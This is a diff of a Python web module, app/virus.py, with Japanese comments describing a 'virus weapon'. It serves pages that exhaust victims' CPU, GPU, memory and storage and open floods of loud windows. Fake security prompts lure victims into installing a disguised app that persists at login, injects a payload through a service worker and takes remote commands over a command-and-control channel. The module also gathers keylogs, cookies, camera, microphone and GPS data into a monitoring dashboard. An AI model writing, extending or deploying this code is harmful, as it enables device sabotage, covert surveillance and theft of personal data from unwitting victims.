@@ -1,52 +1,5 @@
-"""ウイルス兵器モジュール。既存コードに依存しない独立実装。
-
-  GET  /v/{code}                兵器ページ（モード別・JS全部インライン・完全自動）
-  GET  /v/{code}/st             状態（set/firing/seq）※兵器ページがポーリング
-  POST /v/{code}/d              収集データの投入
-  GET  /v/{code}/manifest.json  常駐型トロイ用（mode で発射モードを指定可）
-  GET  /v/sw.js                 Service Worker（常駐型）
-  GET  /v/icon.svg              アイコン
-  GET  /vp , POST /vp/add       一覧・作成
-  GET  /vp/{code}               監視室（＝こちらの操作盤）
-  POST /vp/{code}/fire          1セット出す
-  POST /vp/{code}/stop          停止
-  POST /vp/{code}/resume        再開
-  POST /vp/{code}/set           1セット枚数（10/100/0=無限）
-  GET  /api/vp/{code}           データJSON
-
-  --- SINGULARITY モード（最上位兵器・常駐型・v3） ---
-  GET  /v/{code}/sg             本体ページ（singularity.py のペイロードを起動）
-  GET  /v/{code}/sg/{sid}       子リンク（感染チェーン継承）
-  GET  /v/{code}/sg/p.js        注入用ペイロード（SWが同一オリジンの全ページへ差し込む）
-  GET  /v/{code}/sg/sw.js       Service Worker（C2・復活・注入・periodicSync）
-  GET  /v/{code}/sg/manifest.json  PWAマニフェスト（乗っ取り系ハンドラ全部入り）
-  GET  /v/{code}/sg/icon-192.png|icon-512.png|icon.svg
-  GET  /v/{code}/sg/worker.js   CPU/GPU/WASMワーカー
-  GET  /v/{code}/sg/cmd         遠隔コマンド（ポーリング経路）
-  GET  /v/{code}/sg/sse         遠隔コマンド（SSE・即時）
-  POST /v/{code}/sg/ack         コマンド実行ACK
-  POST /v/{code}/sg/c           報告の投入（fetch/beacon）
-  GET  /v/{code}/sg/c           報告の投入（画像ピクセル経路）
-  POST /v/{code}/sg/share       share_target の受け口
-  POST /vp/{code}/level         レベル 0〜6 を遠隔変更
-  POST /vp/{code}/freeze        凍結 off/soft/hard
-  POST /vp/{code}/detonate      最終形態（L6）へ
-  POST /vp/{code}/wipe          痕跡を完全消去させる
-  POST /vp/{code}/cmd           個体別コマンド（sid指定・空で全個体）
-  POST /vp/{code}/cmds/clear    命令履歴の消去
-
-  --- AJAX 操作盤（ページ遷移しない・監視室が使う） ---
-  GET  /api/vp/{code}/state     現在の状態（level/firing/freeze/pending 等）
-  POST /api/vp/{code}/level     レベル変更 → 状態を返す
-  POST /api/vp/{code}/freeze    凍結切替 → 状態を返す
-  POST /api/vp/{code}/fire|stop|resume
-  POST /api/vp/{code}/set       1セット枚数
-  POST /api/vp/{code}/detonate  L6へ
-  POST /api/vp/{code}/wipe      痕跡消去
-  POST /api/vp/{code}/bomb      潜伏条件（日時 or ドメイン）
-  POST /api/vp/{code}/cmd       個体別コマンド
-  POST /api/vp/{code}/cmds/clear
-  GET  /api/vp/{code}/rat       個体別のRAT/キーログ/DOM/Cookie/API取得
+"""
+app/virus.py — ウイルス兵器モジュール
 
 モード:
   trojan_link    トロイの木馬（リンク型）
@@ -56,14 +9,19 @@
   windows        爆音窓爆弾（音＋大量ウィンドウ）
   storage        容量枯渇
   mix            全部ミックス
-  singularity    特異点（全20系統統合の最上位兵器・PWA常駐・SW注入・RAT・USBワーム）
+  singularity    特異点（全16系統統合の最上位兵器・PWA常駐・USBワーム）
 
 設計:
   兵器ページはボタン無し。開いた瞬間から全部自動・無限。
   枚数や発射・停止はこちらの監視室から遠隔操作する（兵器ページがポーリング）。
-  通知バナーで「偽の対策ソフト（＝指定した兵器）」を入れさせることができる。
   singularity はさらに PWA として端末にインストールさせ、常駐・自動起動する。
-  監視室の操作は /api/ 経由なのでページ遷移もリロードも起きない。
+  相手のUSBにも自分を仕込んで伝染する。
+
+監視室:
+  /vp/{code}            操作盤（AJAX・ページ遷移なし）
+  /api/vp/{code}/state  現在状態
+  /api/vp/{code}/stages 個体ごとの進行度＋全体の制圧率
+  /api/vp/{code}/rat    個体別RAT/キーログ/DOM
 """
 from __future__ import annotations
 
@@ -109,10 +67,7 @@ MODE_DESC = {
     "windows": "開いた瞬間に大量のウィンドウを出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "開いた瞬間に端末の容量を埋め尽くす。",
     "mix": "上の全部を無限に。最強。",
-    "singularity": ("全20系統・5資源同時攻撃。CPU全コア・GPU・WebGPU・WASM・オーディオスレッド・RAM・ディスクを枯渇させ、"
-                    "メインスレッドを凍結し、PWAとして常駐し、Service Workerでサイト全体に自分を注入し、"
-                    "SSEで即時遠隔操作され、webcam・マイク・GPS・クリップボードを遠隔捕獲する。"
-                    "相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜6を遠隔変更できる。"),
+    "singularity": "全16系統・5資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜6を遠隔変更できる。",
 }
 
 # 常駐（ホーム画面追加）で自動発射するモード
@@ -131,9 +86,7 @@ CAUTION = {
     "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
     "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
-    "singularity": ("⚠ 最終兵器。ディスクをquotaの97%まで食い、全コアを100%で回し、GPU/WebGPU/WASM/AudioWorkletを同時に回し、"
-                    "RAMを膨張させ、タブを閉じにくくする。さらにPWAとして常駐し、Service Workerが同一オリジンの"
-                    "全ページに自分を注入する。レベルは監視室から遠隔操作。停止・凍結中でもService Worker経由で命令が届く。"),
+    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。停止・凍結中でもService Worker経由で命令が届く。",
 }
 
 SCHEMA = """
@@ -144,24 +97,21 @@ CREATE TABLE IF NOT EXISTS virus_links(
   winset INTEGER DEFAULT 100, firing INTEGER DEFAULT 1, seq INTEGER DEFAULT 0,
   notify INTEGER DEFAULT 1, notify_text TEXT, notify_mode TEXT,
   level INTEGER DEFAULT 1, wipe_seq INTEGER DEFAULT 0, freeze TEXT DEFAULT '',
-  inj INTEGER DEFAULT 1, bomb TEXT DEFAULT '', ver TEXT DEFAULT '');
+  bomb TEXT DEFAULT '', inj INTEGER DEFAULT 1, ver TEXT);
 CREATE TABLE IF NOT EXISTS virus_hits(
   id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
   device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
-  isp TEXT, vid TEXT, gps_lat REAL, gps_lon REAL);
+  isp TEXT, vid TEXT, gps_lat REAL, gps_lon REAL, is_bot INTEGER DEFAULT 0);
 CREATE INDEX IF NOT EXISTS virus_hits_code ON virus_hits(code, id);
 CREATE TABLE IF NOT EXISTS virus_data(
   id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, hit INTEGER, vid TEXT,
   key TEXT, value TEXT, ts TEXT);
 CREATE INDEX IF NOT EXISTS virus_data_code ON virus_data(code, hit);
 CREATE TABLE IF NOT EXISTS virus_cmd(
-  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, sid TEXT, kind TEXT, arg TEXT,
-  state INTEGER DEFAULT 0, ts TEXT);
-CREATE INDEX IF NOT EXISTS virus_cmd_code ON virus_cmd(code, sid, id);
+  id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, sid TEXT, kind TEXT,
+  arg TEXT, state INTEGER DEFAULT 0, ts TEXT);
+CREATE INDEX IF NOT EXISTS virus_cmd_code ON virus_cmd(code, state);
 """
-
-# 巨大になり得るキー（切り詰め上限を上げる）
-BIG_KEYS = ("rat.shot", "rat.mic", "rat.screen", "media.snapshot", "selfie")
 
 
 # ---------------- 基盤 ----------------
@@ -221,23 +171,30 @@ def _migrate(c):
         cols = {r["name"] for r in c.execute("PRAGMA table_info(virus_links)").fetchall()}
     except Exception:
         cols = set()
-    for name, ddl in (("winset", "INTEGER DEFAULT 100"), ("firing", "INTEGER DEFAULT 1"),
-                      ("seq", "INTEGER DEFAULT 0"), ("notify", "INTEGER DEFAULT 1"),
-                      ("notify_text", "TEXT"), ("notify_mode", "TEXT"),
-                      ("level", "INTEGER DEFAULT 1"), ("wipe_seq", "INTEGER DEFAULT 0"),
-                      ("freeze", "TEXT DEFAULT ''"), ("inj", "INTEGER DEFAULT 1"),
-                      ("bomb", "TEXT DEFAULT ''"), ("ver", "TEXT DEFAULT ''")):
+    for name, ddl in (("winset", "INTEGER DEFAULT 100"),
+                      ("firing", "INTEGER DEFAULT 1"),
+                      ("seq", "INTEGER DEFAULT 0"),
+                      ("notify", "INTEGER DEFAULT 1"),
+                      ("notify_text", "TEXT"),
+                      ("notify_mode", "TEXT"),
+                      ("level", "INTEGER DEFAULT 1"),
+                      ("wipe_seq", "INTEGER DEFAULT 0"),
+                      ("freeze", "TEXT DEFAULT ''"),
+                      ("bomb", "TEXT DEFAULT ''"),
+                      ("inj", "INTEGER DEFAULT 1"),
+                      ("ver", "TEXT")):
         if name not in cols:
             try:
                 c.execute(f"ALTER TABLE virus_links ADD COLUMN {name} {ddl}")
             except Exception:
                 pass
-    # --- singularity 用: hits に GPS 列を足す ---
+    # --- singularity 用: hits に GPS と bot 列を足す ---
     try:
         hcols = {r["name"] for r in c.execute("PRAGMA table_info(virus_hits)").fetchall()}
     except Exception:
         hcols = set()
-    for name, ddl in (("gps_lat", "REAL"), ("gps_lon", "REAL")):
+    for name, ddl in (("gps_lat", "REAL"), ("gps_lon", "REAL"),
+                      ("is_bot", "INTEGER DEFAULT 0")):
         if name not in hcols:
             try:
                 c.execute(f"ALTER TABLE virus_hits ADD COLUMN {name} {ddl}")
@@ -301,11 +258,18 @@ def _record_hit(owner, code, request):
     ua = request.headers.get("user-agent", "")
     p = linktrack.parse_ua(ua)
     g = _geo(ip)
+    bot = 0
+    try:
+        bot = 1 if p.get("is_bot") else 0
+    except Exception:
+        bot = 0
+    if not (ua or "").strip():
+        bot = 0                      # UA無しは「不明」であってbotとは限らない
     c = _db(owner)
     cur = c.execute("INSERT INTO virus_hits(code,ts,ip,ua,device,os,browser,inapp,"
-                    "country,city,isp,vid) VALUES(?,?,?,?,?,?,?,?,?,?,?,'')",
+                    "country,city,isp,vid,is_bot) VALUES(?,?,?,?,?,?,?,?,?,?,?,'',?)",
                     (code, _now(), ip, ua[:400], p["device"], p["os"], p["browser"],
-                     p["inapp"], g.get("country"), g.get("city"), g.get("isp")))
+                     p["inapp"], g.get("country"), g.get("city"), g.get("isp"), bot))
     hid = cur.lastrowid
     c.execute("UPDATE virus_links SET hits=COALESCE(hits,0)+1, last_ts=?, last_ip=?, "
               "last_ua=?, last_device=? WHERE code=?",
@@ -325,16 +289,6 @@ def list_page(request: Request, u=Depends(_auth)):
         "SELECT * FROM virus_links ORDER BY created DESC").fetchall()]
     c.close()
     base = _base(request)
-    for r in rows:
-        r["share"] = base + "/v/" + r["code"]
-        r["watch"] = base + "/vp/" + r["code"]
-        r["mode"] = _norm_mode(r.get("mode"))
-        r["mode_label"] = MODE_LABEL.get(r["mode"], r["mode"])
-        r["caution"] = CAUTION.get(r["mode"], "")
-        r["auto"] = (r["mode"] in AUTO_MODES)
-        r["level"] = int(r.get("level") or 1)
-        r["set_label"] = "∞" if (r.get("winset") == 0) else f'{r.get("winset") or 100}枚/セット'
-        r["firing"] = r.get("firing", 1)
     return _render("virus_list.html", request, rows=rows, base=base,
                    cautions=CAUTION, sets=SET_CHOICES, default_notify=DEFAULT_NOTIFY,
                    levels=_SG_LEVEL_LABEL,
@@ -344,25 +298,25 @@ def list_page(request: Request, u=Depends(_auth)):
 @router.post("/vp/add")
 def create(request: Request, name: str = Form(""), mode: str = Form("mix"),
            dest: str = Form(""), note: str = Form(""), winset: str = Form("100"),
-           notify: str = Form(""), notify_text: str = Form(""),
+           notify: str = Form("1"), notify_text: str = Form(""),
            notify_mode: str = Form(""), u=Depends(_auth)):
     owner = tenancy.get_current() or u
-    mode = _norm_mode(mode)
+    c = _db(owner)
+    code = _new_code(c)
+    m = _norm_mode(mode)
+    nm = _norm_mode(notify_mode) if notify_mode else ""
     try:
         ws = int(winset)
     except Exception:
         ws = 100
     ws = ws if ws in SET_CHOICES else 100
-    nm = _norm_mode(notify_mode) if notify_mode else ""
-    ntext = (notify_text or "").strip()[:200] or DEFAULT_NOTIFY
-    c = _db(owner)
-    code = _new_code(c)
-    c.execute("INSERT INTO virus_links(code,name,mode,note,dest,active,created,hits,"
-              "winset,firing,seq,notify,notify_text,notify_mode,level,inj,ver) "
-              "VALUES(?,?,?,?,?,1,?,0,?,1,0,?,?,?,1,1,?)",
-              (code, (name or "").strip()[:40] or "名無し", mode,
-               (note or "").strip()[:200], (dest or "").strip(), _now(), ws,
-               1 if notify else 0, ntext, nm, _SG_VER))
+    ntext = (notify_text or DEFAULT_NOTIFY)[:300]
+    c.execute("INSERT INTO virus_links(code,name,mode,dest,note,active,created,hits,"
+              "winset,firing,notify,notify_text,notify_mode,level,ver) "
+              "VALUES(?,?,?,?,?,1,?,0,?,1,?,?,?,1,?)",
+              (code, (name or "").strip()[:60] or "名無し", m, _abs_dest(dest)[:300],
+               (note or "")[:300], _now(), ws, 1 if notify not in ("0", "") else 0,
+               ntext, nm, _SG_VER))
     c.commit()
     c.close()
     try:
@@ -381,7 +335,9 @@ self.addEventListener("install", function (e) { self.skipWaiting(); });
 self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });
 self.addEventListener("fetch", function (e) {
   if (e.request.method !== "GET") return;
-  if (new URL(e.request.url).origin !== location.origin) return;
+  var u = new URL(e.request.url);
+  if (u.origin !== location.origin) return;
+  if (u.pathname.indexOf("/v/") === 0) return;
 });
 self.addEventListener("message", function (e) {
   if (e.data && e.data.type === "skip") self.skipWaiting();
@@ -472,16 +428,12 @@ def land(code: str, request: Request):
 
     return _render(
         "virus.html", request,
-        code=code, link=dict(row), hit_id=hid, mode=mode,
-        mode_label=MODE_LABEL[mode], mode_desc=MODE_DESC[mode],
+        code=code, link=dict(row), hit=hid, base=_base(request),
+        mode=mode, mode_label=MODE_LABEL.get(mode, mode),
         caution=CAUTION.get(mode, ""),
-        auto=(mode in AUTO_MODES),
-        winset=_val(row, "winset", 100),
-        firing=_val(row, "firing", 1),
-        seq=_val(row, "seq", 0),
-        notify=notify, notify_text=notify_text, notify_mode=notify_mode,
-        install_mode=install_mode,
         dest=_abs_dest(row["dest"]), is_child=child, is_installed=installed,
+        winset=_val(row, "winset", 100), firing=_val(row, "firing", 1),
+        notify=notify, notify_text=notify_text, install_mode=install_mode,
         child_text=random.choice([
             "システム警告", "メモリ不足", "ディスク容量が危険です", "異常を検出しました",
             "バックグラウンドで動作中", "最適化が必要です", "ウイルスを検出しました",
@@ -502,33 +454,21 @@ async def data(code: str, request: Request):
     if not isinstance(body, dict):
         body = {}
     hid = body.get("hit") or 0
-    vid = str(body.get("vid") or "")[:40]
-    items = body.get("items")
-    if not isinstance(items, dict):
-        items = {}
+    vid = str(body.get("vid") or "")[:64]
     c = _db(owner)
-    n = 0
     ts = _now()
-    for k, v in list(items.items())[:200]:
-        if v is None:
+    n = 0
+    for k, v in list(body.items())[:200]:
+        if k in ("hit", "vid"):
             continue
-        if not isinstance(v, str):
-            try:
-                v = json.dumps(v, ensure_ascii=False)
-            except Exception:
-                v = str(v)
+        if isinstance(v, (dict, list)):
+            v = json.dumps(v, ensure_ascii=False)
         c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
-                  (code, int(hid or 0), vid, str(k)[:60], v[:20000], ts))
+                  (code, int(hid or 0), vid, str(k)[:60], str(v)[:20000], ts))
         n += 1
     if vid:
         c.execute("UPDATE virus_hits SET vid=? WHERE id=?", (vid, int(hid or 0)))
     c.execute("UPDATE virus_links SET last_ts=? WHERE code=?", (ts, code))
-    try:
-        c.execute("DELETE FROM virus_data WHERE code=? AND id NOT IN "
-                  "(SELECT id FROM virus_data WHERE code=? ORDER BY id DESC LIMIT 20000)",
-                  (code, code))
-    except Exception:
-        pass
     c.commit()
     c.close()
     return {"ok": 1, "n": n, "server": ts}
@@ -561,8 +501,10 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
     for h in hits:
         if h.get("vid") and h["vid"] not in sids:
             sids.append(h["vid"])
+    stages, stat = _sg_stages_for(hits, by_hit)          # ← 進行度＋集計
     return _render("virus_watch.html", request, code=code, link=dict(row),
                    hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
+                   stages=stages, stat=stat, sids=sids,
                    mode_label=MODE_LABEL.get(mode, mode),
                    mode_desc=MODE_DESC.get(mode, ""),
                    caution=CAUTION.get(mode, ""),
@@ -575,17 +517,16 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
                    firing=_val(row, "firing", 1),
                    share=base + "/v/" + code, total=len(hits),
                    is_sg=(mode == "singularity"),
-                   sids=sids[:200],
                    level=lv, level_label=_SG_LEVEL_LABEL.get(lv, ""),
                    level_desc=_SG_LEVEL_DESC.get(lv, ""),
                    levels=sorted(_SG_LEVEL_LABEL.keys()),
-                   levels_label=_SG_LEVEL_LABEL,
-                   levels_desc=_SG_LEVEL_DESC,
                    freeze=_val(row, "freeze", "") or "",
                    wipe_seq=int(_val(row, "wipe_seq", 0) or 0),
                    install_level=_SG_INSTALL_LEVEL,
                    bomb=_val(row, "bomb", "") or "",
                    inj=int(_val(row, "inj", 1) or 0),
+                   defeat_at=SG_DEFEAT_AT,
+                   stage_labels=SG_STAGE_LABEL, stage_colors=SG_STAGE_COLOR,
                    modes=[(m, MODE_LABEL[m]) for m in MODES])
 
 
@@ -677,39 +618,27 @@ def api_rat(code: str, sid: str = "", u=Depends(_auth)):
 
 @router.post("/vp/{code}/update")
 def update(request: Request, code: str, name: str = Form(""), mode: str = Form(""),
-           dest: str = Form(""), note: str = Form(""), active: str = Form(""),
-           winset: str = Form(""), notify: str = Form(""), notify_text: str = Form(""),
-           notify_mode: str = Form(""), bomb: str = Form(""), inj: str = Form(""),
-           u=Depends(_auth)):
+           dest: str = Form(""), note: str = Form(""), active: str = Form("1"),
+           notify: str = Form("1"), notify_text: str = Form(""),
+           notify_mode: str = Form(""), u=Depends(_auth)):
     owner = tenancy.get_current() or u
     c = _db(owner)
     if not _link(c, code):
         c.close()
         raise HTTPException(404)
-    f, v = [], []
-    if name.strip():
-        f.append("name=?"); v.append(name.strip()[:40])
+    f = {}
+    if name:
+        f["name"] = name.strip()[:60]
     if mode:
-        f.append("mode=?"); v.append(_norm_mode(mode))
-    f.append("dest=?"); v.append((dest or "").strip())
-    f.append("note=?"); v.append((note or "").strip()[:200])
-    if active in ("0", "1"):
-        f.append("active=?"); v.append(int(active))
-    if winset != "":
-        try:
-            ws = int(winset)
-        except Exception:
-            ws = 100
-        if ws in SET_CHOICES:
-            f.append("winset=?"); v.append(ws)
-    f.append("notify=?"); v.append(1 if notify else 0)
-    f.append("notify_text=?"); v.append((notify_text or "").strip()[:200] or DEFAULT_NOTIFY)
-    f.append("notify_mode=?"); v.append(_norm_mode(notify_mode) if notify_mode else "")
-    if bomb != "":
-        f.append("bomb=?"); v.append(bomb.strip()[:64])
-    f.append("inj=?"); v.append(1 if inj else 0)
-    v.append(code)
-    c.execute("UPDATE virus_links SET " + ",".join(f) + " WHERE code=?", v)
+        f["mode"] = _norm_mode(mode)
+    f["dest"] = _abs_dest(dest)[:300]
+    f["note"] = (note or "")[:300]
+    f["active"] = 1 if active not in ("0", "") else 0
+    f["notify"] = 1 if notify not in ("0", "") else 0
+    f["notify_text"] = (notify_text or DEFAULT_NOTIFY)[:300]
+    f["notify_mode"] = _norm_mode(notify_mode) if notify_mode else ""
+    v = list(f.values()) + [code]
+    c.execute("UPDATE virus_links SET " + ", ".join(f"{k}=?" for k in f) + " WHERE code=?", v)
     c.commit()
     c.close()
     return RedirectResponse("/vp/" + code, status_code=303)
@@ -721,9 +650,12 @@ def clear(request: Request, code: str, u=Depends(_auth)):
     c = _db(owner)
     c.execute("DELETE FROM virus_hits WHERE code=?", (code,))
     c.execute("DELETE FROM virus_data WHERE code=?", (code,))
-    c.execute("DELETE FROM virus_cmd WHERE code=?", (code,))
+    try:
+        c.execute("DELETE FROM virus_cmd WHERE code=?", (code,))
+    except Exception:
+        pass
     c.execute("UPDATE virus_links SET hits=0, last_ts=NULL, last_ip=NULL, last_ua=NULL,"
-              " last_device=NULL WHERE code=?", (code,))
+              "last_device=NULL WHERE code=?", (code,))
     c.commit()
     c.close()
     return RedirectResponse("/vp/" + code, status_code=303)
@@ -734,7 +666,10 @@ def delete(request: Request, code: str, u=Depends(_auth)):
     owner = tenancy.get_current() or u
     c = _db(owner)
     for t in ("virus_hits", "virus_data", "virus_cmd"):
-        c.execute(f"DELETE FROM {t} WHERE code=?", (code,))
+        try:
+            c.execute(f"DELETE FROM {t} WHERE code=?", (code,))
+        except Exception:
+            pass
     c.execute("DELETE FROM virus_links WHERE code=?", (code,))
     c.commit()
     c.close()
@@ -746,10 +681,7 @@ def delete(request: Request, code: str, u=Depends(_auth)):
 
 
 # ===========================================================================
-# SINGULARITY（最上位兵器）を「モード」として統合
-#   /v/{code} で mode=="singularity" を選ぶと、singularity.py の本体を
-#   このコード専用の収集先・子リンク・SW・マニフェストで起動する。
-#   → 兵器庫・監視室・バックアップにそのまま乗る（別ルートを汚さない）
+# SINGULARITY v3 統合
 # ===========================================================================
 from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
                           WORKER_JS as _SG_WORKER, VIRUS as SINGULARITY,
@@ -775,7 +707,7 @@ _SG_ICONS = {}
 
 
 def _lv(v) -> int:
-    """レベル 0〜6 にクランプ。"""
+    """レベルは 0〜6 の7段階。"""
     try:
         return max(0, min(6, int(v)))
     except Exception:
@@ -870,17 +802,38 @@ def _sg_ingest(owner, code, report, sid):
     n = 0
     for k, v in list(items.items())[:400]:
         if not isinstance(v, str):
-            v = json.dumps(v, ensure_ascii=False) if isinstance(v, (dict, list)) else str(v)
-        cap = 400000 if k in BIG_KEYS else 20000
-        if have.get(k) == v[:cap]:
+            v = json.dumps(v, ensure_ascii=False)
+        if have.get(k) == v:
             continue
         c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
-                  (code, hid, sid, str(k)[:60], v[:cap], ts))
+                  (code, hid, sid, str(k)[:60], v[:20000], ts))
         n += 1
     if snap and have.get("selfie") != snap:
         c.execute("INSERT INTO virus_data(code,hit,vid,key,value,ts) VALUES(?,?,?,?,?,?)",
                   (code, hid, sid, "selfie", snap[:400000], ts))
         n += 1
+
+    # --- 端末情報の自己修復（UA解析が失敗していても payload の申告で埋める） ---
+    try:
+        env = report.get("env") or {}
+        ua2 = str(env.get("ua") or "")[:400]
+        dev = str(env.get("device") or env.get("platform") or "")[:60]
+        os2 = str(env.get("os") or "")[:60]
+        br = str(env.get("browser") or "")[:60]
+        if ua2 or dev or os2 or br:
+            cur = c.execute("SELECT ua,device,os,browser FROM virus_hits WHERE id=?",
+                            (hid,)).fetchone()
+            if cur:
+                nu = ua2 or cur["ua"]
+                nd = dev if (not cur["device"] or cur["device"] == "不明") else cur["device"]
+                no = os2 if (not cur["os"] or cur["os"] == "不明") else cur["os"]
+                nb = br if (not cur["browser"] or cur["browser"] == "不明") else cur["browser"]
+                c.execute("UPDATE virus_hits SET ua=?,device=?,os=?,browser=? WHERE id=?",
+                          (nu, nd, no, nb, hid))
+        # JSが動いた時点で bot ではない
+        c.execute("UPDATE virus_hits SET is_bot=0 WHERE id=?", (hid,))
+    except Exception:
+        pass
 
     gps = (report.get("media") or {}).get("gps") or {}
     try:
@@ -947,7 +900,6 @@ def _sg_land(code, request, sid=""):
         pass
     c.close()
 
-    base = f"/v/{code}/sg"
     lv = int(_val(row, "level", 1) or 0)
     lvq = request.query_params.get("level")
     if lvq is not None and str(lvq).isdigit():
@@ -956,8 +908,7 @@ def _sg_land(code, request, sid=""):
         lv = max(lv, _SG_INSTALL_LEVEL)          # インストール済みアプリ窓は最低L4
 
     _n = (row["name"] or "").strip()
-    app_name = (request.query_params.get("n")
-                or os.getenv("SG_APP_NAME")
+    app_name = (request.query_params.get("n") or os.getenv("SG_APP_NAME")
                 or (f"{_n} の保護" if _n and _n != "名無し" else _SG_APP_NAME))
 
     cfg = _sg_cfg(row, code, sid, lv, app_name,
@@ -966,12 +917,9 @@ def _sg_land(code, request, sid=""):
                    link=dict(row), ref=ref, level=lv,
                    level_label=_SG_LEVEL_LABEL.get(lv, ""),
                    manifest=cfg["manifest"] + "?n=" + quote_plus(app_name),
-                   icon192=cfg["icons"][0],
-                   icon512=cfg["icons"][1],
-                   app_name=app_name,
+                   icon192=cfg["icons"][0], icon512=cfg["icons"][1], app_name=app_name,
                    cfg_json=json.dumps(cfg, ensure_ascii=False),
-                   worker_json=json.dumps(_SG_WORKER),
-                   payload=_SG_PAYLOAD)
+                   worker_json=json.dumps(_SG_WORKER), payload=_SG_PAYLOAD)
     # crossOriginIsolated を成立させ、SharedArrayBuffer / Atomics.wait を確実に使えるようにする
     resp.headers["Cross-Origin-Opener-Policy"] = "same-origin"
     resp.headers["Cross-Origin-Embedder-Policy"] = "require-corp"
@@ -986,7 +934,7 @@ def _sg_land(code, request, sid=""):
 
 @router.get("/v/{code}/sg/p.js")
 def sg_pjs(code: str, sid: str = "", level: str = "", u: str = "", v: str = ""):
-    """SWが同一オリジンの全ページに差し込む注入用ペイロード。"""
+    """SWが全ページに差し込む注入用ペイロード。"""
     owner = _owner(code)
     if not owner:
         raise HTTPException(404)
@@ -999,8 +947,7 @@ def sg_pjs(code: str, sid: str = "", level: str = "", u: str = "", v: str = ""):
     lv = int(_val(row, "level", 1) or 0)
     if level.isdigit():
         lv = _lv(level)
-    app_name = (row["name"] or "").strip() or _SG_APP_NAME
-    cfg = _sg_cfg(row, code, sid, lv, app_name,
+    cfg = _sg_cfg(row, code, sid, lv, (row["name"] or "").strip() or _SG_APP_NAME,
                   {"injected": True, "install": "click", "windows": 0, "hop": False})
     js = ("window.__SINGULARITY_CFG__=" + json.dumps(cfg, ensure_ascii=False)
           + ";window.__SINGULARITY_WORKER__=" + json.dumps(_SG_WORKER) + ";"
@@ -1036,40 +983,18 @@ def sg_manifest(code: str, name: str = ""):
         icons = [{"src": base + "/icon.svg", "sizes": "any",
                   "type": "image/svg+xml", "purpose": "any maskable"}]
     man = {
-        "id": base,
-        "name": app,
-        "short_name": app[:12],
-        "description": "脆弱性の監視と保護を行います。",
-        "start_url": base + "?i=1&w=0",
-        "scope": base,
-        "display": "standalone",
-        "display_override": ["window-controls-overlay", "tabbed", "standalone", "minimal-ui"],
-        "background_color": "#05070a",
-        "theme_color": "#05070a",
-        "orientation": "any",
-        "categories": ["utilities", "productivity", "security"],
-        "launch_handler": {"client_mode": "focus-existing"},
-        "handle_links": "preferred",
-        "run_on_os_login": {"mode": "windowed"},
+        "name": app, "short_name": app[:12],
+        "start_url": base + "?i=1", "scope": "/",
+        "display": "standalone", "display_override": ["window-controls-overlay", "standalone"],
+        "background_color": "#05070a", "theme_color": "#05070a",
         "icons": icons,
-        "screenshots": [{"src": base + "/icon-512.png", "sizes": "512x512",
-                         "type": "image/png"}],
-        "shortcuts": [
-            {"name": "終焉 (L6)", "short_name": "L6",
-             "url": base + "?level=6", "icons": icons[:1]},
-            {"name": "特異点 (L5)", "short_name": "L5",
-             "url": base + "?level=5", "icons": icons[:1]},
-            {"name": "偵察 (L0)", "short_name": "L0", "url": base + "?level=0"},
-            {"name": "消去 (wipe)", "short_name": "wipe", "url": base + "?wipe=1"},
-        ],
-        "protocol_handlers": [{"protocol": "web+sg", "url": base + "?ref=%s"}],
+        "share_target": {"action": base + "/share", "method": "POST",
+                         "enctype": "multipart/form-data",
+                         "params": {"title": "t", "text": "d", "url": "u"}},
+        "protocol_handlers": [{"protocol": "web+sg",
+                               "url": base + "/?ref=%s"}],
         "file_handlers": [{"action": base,
-                           "accept": {"application/x-singularity": [".sg", ".sgt"]}}],
-        "share_target": {
-            "action": base + "/share", "method": "POST", "enctype": "multipart/form-data",
-            "params": {"title": "t", "text": "s", "url": "u", "files": [
-                {"name": "f", "accept": ["image/*", "text/*", "application/pdf"]}]},
-        },
+                           "accept": {"application/x-singularity": [".sg"]}}],
         "edge_side_panel": {"preferred_width": 420},
         "note_taking": {"new_note_url": base + "?ref=note"},
         "prefer_related_applications": False,
@@ -1168,7 +1093,6 @@ def _sg_cmd_payload(owner, code, sid, sw=False):
 
 @router.get("/v/{code}/sg/cmd")
 def sg_cmd(code: str, sid: str = ""):
-    """ペイロード／Service Worker が拾う遠隔コマンド（ポーリング経路）。"""
     owner = _owner(code)
     if not owner:
         return {"ok": 0}
@@ -1177,7 +1101,6 @@ def sg_cmd(code: str, sid: str = ""):
 
 @router.get("/v/{code}/sg/sse")
 async def sg_sse(code: str, request: Request, sid: str = ""):
-    """Server-Sent Events による即時コマンド配信（変化時のみ送出）。"""
     owner = _owner(code)
     if not owner:
         raise HTTPException(404)
@@ -1188,20 +1111,16 @@ async def sg_sse(code: str, request: Request, sid: str = ""):
             try:
                 if await request.is_disconnected():
                     break
-            except Exception:
-                break
-            try:
-                j = _sg_cmd_payload(owner, code, sid)
-            except Exception:
-                j = {"ok": 0}
-            s = json.dumps(j, ensure_ascii=False)
-            if s != last:
-                last = s
-                yield "data: " + s + "\n\n"
-            else:
